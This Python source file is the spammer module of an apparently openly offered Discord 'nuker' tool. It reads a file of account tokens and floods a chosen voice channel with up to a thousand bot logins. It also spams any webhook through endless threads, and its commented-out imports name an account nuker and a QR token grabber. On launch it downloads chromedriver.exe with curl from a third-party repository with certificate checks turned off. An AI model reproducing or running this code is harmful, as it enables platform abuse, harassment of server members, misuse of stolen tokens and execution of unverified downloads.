# 
# Coded / Dev / Owner: 915#0001
# Copyright © 915#0001
######################################################### 

from utilities.Settings.common import *
from utilities.Settings.libarys import *
from utilities.Settings.update import search_for_updates

# import utilities.Plugins.Account_Nuker
# import utilities.Plugins.Auto_Login
# import utilities.Plugins.DM_Deleter
# import utilities.Plugins.Token_Info
# import utilities.Plugins.QR_Grabber

w = Fore.WHITE
b = Fore.BLACK
g = Fore.LIGHTGREEN_EX
y = Fore.LIGHTYELLOW_EX
m = Fore.LIGHTMAGENTA_EX
c = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX
r = Fore.RESET

setTitle(f"Proxies    |    ")
choice = input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] Would You Like To Use Proxies? [Y/N]: {Fore.RESET}")
if choice.lower() == 'y' or choice.lower() == 'yes':
        if os.path.basename(sys.argv[0]).endswith("exe"):
            with open(getTempDir()+"\\915_proxies", 'w'): pass
            clear()
            proxy_scrape()
            sleep(0.3)
        try:
            assert sys.version_info >= (3,9)
        except AssertionError:
            print(f"{Fore.RED}Your Python Version is Not supported: ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}), Please Download v3.9+ to use 915-Nuker!{Fore.RESET}")
            sleep(5)
            print("[\x1b[95m1\x1b[95m\x1B[37m] Exiting!")
            sleep(1.5)
            os._exit(0)
        else:
            with open(getTempDir()+"\\915_proxies", 'w'): pass
            clear()
            proxy_scrape()
            sleep(0.3)
        finally:
            Fore.RESET
if choice.lower() == 'n' or choice.lower() == 'no':
    pass

#########################################################

def Spinner():
	l = ['|', '/', '-', '\\', ' ']
	for i in l+l+l:
		sys.stdout.write(f"""\r {i}""")
		sys.stdout.flush()
		time.sleep(0.1)

global cls
def cls():
 os.system('cls' if os.name=='nt' else 'clear')

def tool():
  os.system('cls' if os.name=='nt' else 'clear')

def clearConsole(): return os.system(
    'cls' if os.name in ('nt', 'dos') else 'clear')

global useragent
def useragent():
    file = open('data/useragent.txt','r')
    useragent = (random.choice(list(file)))
    useragent2 = []
    useragent2.append(useragent)
    useragent1 = []

#########################################################

try:
    with open('data/logins.json') as f:
        config = json.load(f)
except:
    with open('data/logins.json', 'w') as f:
            print(f"\n[{g}#\x1b[95m\x1B[37m] Logging Into 915-Nuker")
            login = input("[\x1b[95m#\x1b[95m\x1B[37m] Enter A Username: ")
            json.dump({"Login": login}, f, indent=4)
    input(f"\n[\x1b[95m#\x1b[95m\x1B[37m] Successfully Logged in as: [{m}{login}{w}]\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER to Continue: ")
    pass
with open('data/logins.json') as f:
    config = json.load(f)
login = config.get('Login')

languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'aud'   : 'English, Austrlia',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

regions = [
    'brazil',
    'hongkong',
    'india',
    'japan',
    'rotterdam',
    'russia',
    'singapore',
    'southafrica',
    'sydney',
    'us-central',
    'us-east',
    'us-south',
    'us-west'
]


def spammer():
    global threads
    setTitle(f"")
    asc = asyncio.get_event_loop()
    tokens = open('tokens.txt', 'r').read().splitlines()
    clear = lambda: os.system('cls')
    clear()









                            

    colorama.init()
    Write.Print(f'{login}\n', Colors.blue_to_purple,  interval=0.000)
    print('')
    print('')
    Write.Print("                                                                \n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                        ██ ▄█▀▄▄▄       ██▓     ██▓ \n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                        ██▄█▒▒████▄    ▓██▒    ▓██▒\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                       ▓███▄░▒██  ▀█▄  ▒██░    ▒██▒\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                       ▓██ █▄░██▄▄▄▄██ ▒██░    ░██░\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                      ▒██▒ █▄▓█   ▓██▒░██████▒░██░\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                       ▒ ▒▒ ▓▒▒▒   ▓▒█░░ ▒░▓  ░░▓  \n", Colors.purple_to_blue, interval=0.000)
    Write.Print(f' > [v{THIS_VERSION}]                            ░ ░▒ ▒░ ▒   ▒▒ ░░ ░ ▒  ░ ▒ ░\n', Colors.purple_to_blue, interval=0.000)
    Write.Print(f'                                       ░ ░░ ░  ░   ▒     ░ ░    ▒ ░\n', Colors.purple_to_blue, interval=0.000)
    Write.Print(" > [Github.com/TT-Tutorials]            ░  ░        ░  ░    ░  ░ ░   \n", Colors.purple_to_blue, interval=0.000)
    Write.Print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.purple_to_blue, interval=0.000)
    print(f'''{m}'''.replace('$', f'{m}${w}') + f'''
   {b}|{Fore.RESET}{m}[{w}1{Fore.RESET}{m}]{Fore.RESET} VC Spammer {b}|{Fore.RESET}{m}[{w}2{Fore.RESET}{m}]{Fore.RESET} WEBHOOK SPAMMER {b}|{Fore.RESET}{m}[{w}3{Fore.RESET}{m}]{Fore.RESET}{lr} EXIT{Fore.RESET}''')
    Write.Print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.blue_to_purple, interval=0.000)
    choice = input(f'{m}[{w}>{m}]{w} Choice?: ')







#   VC SPAMMER
    if choice == '1':
        Spinner()
        setTitle(f"Voice Call Spammer    |    ")
#       tokenfaster = open(easygui.range.faster(), 'r').run().splitlines()
        tokenlist = open(easygui.fileopenbox(), 'r').read().splitlines()
        channel = int(input("\n[\x1b[95m>\x1b[95m\x1B[37m] Voice Channel ID: "))
        server = int(input("[\x1b[95m>\x1b[95m\x1B[37m] Server ID: "))
        deaf = input("[\x1b[95m>\x1b[95m\x1B[37m] Defean: (y/n)? ")
        if deaf == "y":
          deaf = True
          if deaf == "n":
            deaf = False
        mute = input("[\x1b[95m>\x1b[95m\x1B[37m] Mute: (y/n)? ")
        if mute == "y":
          mute = True
          if mute == "n":
            mute = False
        stream = input("[\x1b[95m>\x1b[95m\x1B[37m] Stream: (y/n)? ")
        if stream == "y":
          stream = True
          if stream == "n":
            stream = False
        video = input("[\x1b[95m>\x1b[95m\x1B[37m] Video: (y/n)? ")
        if video == "y":
          video = True
          if video == "n":
            video = False

        executor = ThreadPoolExecutor(max_workers=int(1000))
        def run(token):
          while True:
            ws = WebSocket()
            ws.connect("wss://gateway.discord.gg/?v=8&encoding=json")
            hello = loads(ws.recv())
            heartbeat_interval = hello['d']['heartbeat_interval']
            ws.send(dumps({"op": 2,"d": {"token": token,"properties": {"$os": "windows","$browser": "Discord","$device": "desktop"}}}))
            ws.send(dumps({"op": 4,"d": {"guild_id": server,"channel_id": channel,"self_mute": mute,"self_deaf": deaf, "self_stream?": stream, "self_video": video}}))
            ws.send(dumps({"op": 18,"d": {"type": "guild","guild_id": server,"channel_id": channel,"preferred_region": "singapore"}}))
            ws.send(dumps({"op": 1,"d": None}))
            sleep(0.1)

        i = 0

        for token in tokenlist:
          executor.submit(run, token)
          i+=1
          print("[\x1B[32m>\x1B[32m\x1B[37m] Joined VC")
          sleep(0.01)
        yay = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER to Stop VC Spammer!")






#   WEBHOOK SPAMMER
    if choice == '2':
        Spinner()
        setTitle(f"Webhook Spammer    |    ")
        session = requests.Session()
        webhook = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Webhook URL: ")
        message = input("[\x1b[95m>\x1b[95m\x1B[37m] Message: ")
        username = input("[\x1b[95m>\x1b[95m\x1B[37m] Webhook Username?: ")

        def gang():
            session.post(webhook,json = {"content":message,"username":username})
    
            while True:
                for i in range(15):
                    threading.Thread(target=gang).start()
        gang()


#   EXIT
    if choice == '3':
        Spinner()
        exit = True if input(f"\n[{Fore.LIGHTMAGENTA_EX}>{Fore.RESET}] Are You Sure You Want To Exit 915-Nuker? Y/N: ").lower() == "y" else spammer() or "n" == sys.exit(0)
    else:
        print(f"")
        time.sleep(0)
        return spammer()
	

#   AUTO DOWNLOAD DRIVERS
if __name__ == "__main__":
                import sys
                setTitle(f"Dowloading Drivers    |    ")
                os.system("""if not exist "./chromedriver.exe" echo [+] Downloading Drivers: """)
                os.system("""if not exist "./chromedriver.exe" curl -#fkLo "./chromedriver.exe" "https://github.com/TT-Tutorials/addons/raw/main/chromedriver.exe" """)
                if os.path.basename(sys.argv[0]).endswith("exe"):
                    search_for_updates()
                    if not os.path.exists(getTempDir()+"\\915_proxies"):
                        proxy_scrape()
                    clear()
                else:
                    search_for_updates()
                    if not os.path.exists(getTempDir()+"\\915_proxies"):
                        proxy_scrape()
                    clear()
                    spammer()
